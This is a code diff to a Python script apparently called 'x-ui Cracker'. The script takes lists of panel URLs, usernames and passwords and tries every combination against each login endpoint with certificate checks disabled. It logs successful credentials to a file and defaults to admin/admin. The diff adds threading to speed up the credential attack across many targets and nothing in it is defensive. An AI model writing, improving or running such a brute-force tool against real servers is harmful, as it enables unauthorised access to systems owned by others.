@@ -1,12 +1,13 @@
+import urllib3
 import requests
 import argparse
-import urllib3
-import json
+import threading
 from src import banners
 from colorama import Fore
 
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
 
 def login(url, username, password, success_file):
     headers = {
@@ -33,33 +34,34 @@ def login(url, username, password, success_file):
         'password': password
     }
 
-    response = requests.post(url, headers=headers, data=data, verify=False)
+    try:
+        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
 
-    # Validate the response
-    if response.ok:
-        response_data = response.json()
-        if response_data['success']:
-            print(f"{Fore.GREEN}Login successful! URL: {url}, Username: {username}, Password: {password}{Fore.RESET}")
-            with open(success_file, 'a') as file:
-                file.write(f"URL: {url}, Username: {username}, Password: {password}\n")
+        # Validate the response
+        if response.ok:
+            response_data = response.json()
+            if response_data['success']:
+                print(f"{Fore.GREEN}Login successful! URL: {url}, Username: {username}, Password: {password}{Fore.RESET}")
+                with open(success_file, 'a') as file:
+                    file.write(f"URL: {url}, Username: {username}, Password: {password}\n")
+            else:
+                print(f"{Fore.RED}Login failed for URL: {url} with username: {username}{Fore.RESET}")
         else:
-            print(f"{Fore.RED}Login failed for URL: {url} with username: {username}{Fore.RESET}")
-    else:
-        print(f"{Fore.RED}Error occurred for URL: {url} {response.text}{Fore.RESET}")
+            print(f"{Fore.RED}The server returned an error: {response.status_code} for URL: {url}{Fore.RESET}")
 
+    except Exception as e:
+        print(f"{Fore.RED}Error occurred while testing URL: {url} with username: {username} and password: {password}{Fore.RESET}")
+        print(e)
+
+def login_thread(url, username, password, success_file):
+    login(url, username, password, success_file)
 
 def load_credentials_from_file(file_path):
     with open(file_path, 'r') as file:
-        return [line.strip().split(',') for line in file]
-
-
-def load_urls_from_file(file_path):
-    with open(file_path, 'r') as file:
-        return file.readlines()
-
+        return [line.strip() for line in file]
 
 def main():
-    banners()  # Call the banners function
+    banners()
 
     parser = argparse.ArgumentParser(
         prog='x-ui Cracker',
@@ -76,18 +78,20 @@ def main():
         return
 
     if args.userfile and args.passfile:
-        credentials = load_credentials_from_file(args.userfile)
+        usernames = load_credentials_from_file(args.userfile)
         passwords = load_credentials_from_file(args.passfile)
-        urls = load_urls_from_file(args.listfile)
+        urls = load_credentials_from_file(args.listfile)
         for url in urls:
             url = url.strip()
-            for username, password in zip(credentials, passwords):
-                login(url, username, password, args.successfile)
+            for username in usernames:
+                for password in passwords:
+                    thread = threading.Thread(target=login_thread, args=(url, username, password, args.successfile))
+                    thread.start()
     else:
-        urls = load_urls_from_file(args.listfile)
+        urls = load_credentials_from_file(args.listfile)
         for url in urls:
-            login(url.strip(), 'admin', 'admin', args.successfile)  # Default credentials if files are not provided
-
+            thread = threading.Thread(target=login, args=(url.strip(), 'admin', 'admin', args.successfile))
+            thread.start()  
 
 if __name__ == "__main__":
     main()
